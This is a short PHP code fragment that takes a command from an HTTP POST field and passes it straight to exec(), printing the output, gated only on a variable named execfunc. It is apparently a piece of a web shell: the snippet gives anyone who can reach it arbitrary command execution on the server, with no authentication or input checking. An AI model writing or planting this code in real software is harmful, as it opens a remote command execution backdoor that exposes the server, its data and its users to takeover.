<?php
	if ($execfunc=="exec") {
		$result = exec($_POST['command']);
		echo $result;
	}
?>